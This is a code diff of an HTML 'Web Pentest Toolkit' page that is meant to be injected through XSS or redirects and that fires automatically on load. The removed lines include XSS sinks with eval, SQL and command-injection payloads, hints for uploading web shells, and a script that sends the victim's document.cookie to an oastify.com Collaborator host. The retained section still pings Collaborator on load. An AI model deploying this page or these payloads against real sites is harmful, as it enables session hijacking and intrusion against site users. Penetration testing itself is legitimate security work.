@@ -9,8 +9,8 @@
     iframe { width: 100%; height: 120px; border: 1px solid #888; margin-top: 10px; }
   </style>
 </head>
-  <h1>🧪 Web Pentest Toolkit (Auto + Cookies)</h1>
-  <p>This page is designed for injection via XSS or redirects. It auto-triggers behavior on load.</p>
+  <h1>🧪 Web Pentest Toolkit (Auto)</h1>
+  <p>It auto-triggers behavior on load.</p>
 
   <!-- 1. Burp Collaborator Pings -->
   <section>
@@ -28,90 +28,6 @@
       document.body.appendChild(i);
     </script>
     <p>Triggers image/script/iframe/WebSocket to Collaborator on load.</p>
-  </section>
-
-  <!-- 2. DOM-Based XSS Sink -->
-  <section>
-    <h2>🧠 DOM XSS Sink (InnerHTML)</h2>
-    <div id="domXssTarget"></div>
-    <script>
-      const hash = decodeURIComponent(location.hash.slice(1));
-      if (hash) {
-        document.getElementById("domXssTarget").innerHTML = hash;
-        if (hash.includes("alert") || hash.includes("onerror")) {
-          alert("🚨 DOM XSS triggered via location.hash!");
-        }
-      }
-    </script>
-    <p>Use: <code>#&lt;img src=x onerror=alert(1)&gt;</code></p>
-  </section>
-
-  <!-- 3. Reflected XSS Simulation -->
-  <section>
-    <h2>🔁 Reflected XSS Simulation</h2>
-    <script>
-      const params = new URLSearchParams(location.search);
-      const xss = params.get("xss");
-      if (xss) {
-        document.write("<div>Injecting input: " + xss + "</div>");
-        try {
-          eval(xss); // simulate execution like reflected XSS
-        } catch {}
-      }
-    </script>
-    <p>Try: <code>?xss=alert(1)</code></p>
-  </section>
-
-  <!-- 4. Clickjacking -->
-  <section>
-    <h2>🖼️ Clickjacking Test</h2>
-    <p>If the login page loads below, it's frameable:</p>
-    <iframe src="https://example.com/login"></iframe>
-  </section>
-
-  <!-- 5. SQLi / CMD Injection -->
-  <section>
-    <h2>🧬 SQLi & CMD Injection Payloads</h2>
-    <p>SQLi: <code>1' OR '1'='1</code> <br> CMDi: <code>127.0.0.1; whoami</code></p>
-  </section>
-
-  <!-- 6. File Upload Test -->
-  <section>
-    <h2>📁 File Upload Form</h2>
-    <form action="/upload" method="POST" enctype="multipart/form-data">
-      <input type="file" name="file">
-      <button>Upload</button>
-    </form>
-    <p>Try uploading: <code>.php</code>, <code>.aspx</code>, <code>.jsp</code>, <code>.svg</code>, etc.</p>
-  </section>
-
-  <!-- 7. Display Cookies -->
-  <section>
-    <h2>🍪 Document Cookies</h2>
-    <pre id="cookieDump"></pre>
-    <script>
-      const c = document.cookie;
-      document.getElementById("cookieDump").textContent = c || "No cookies found.";
-      if (c) alert("🍪 document.cookie: " + c);
-    </script>
-  </section>
-
-  <!-- 8. Alert if loaded in iframe + Cookies-->
- <script>
-  if (window.top !== window.self) {
-    alert("👀 Loaded in iframe — likely part of XSS or clickjacking chain.\n\n🍪 Cookies: " + document.cookie);
-  }
-</script>
-   <!-- 9. Send Cookies to the Collab-->
-  <section>
-    <h2>🍪 Document Cookies - Exfil</h2> 
-    <script>
-  const exfil = "t2wenwq764pqivxdk8vsvmw7eykp8mwb.oastify.com"; // Replace with your Burp Collaborator domain
-
-  if (document.cookie) {
-    new Image().src = "http://" + exfil + "/?" + "cookie=" + document.cookie;
-  }
-    </script>
   </section>
 </body>
 </html>
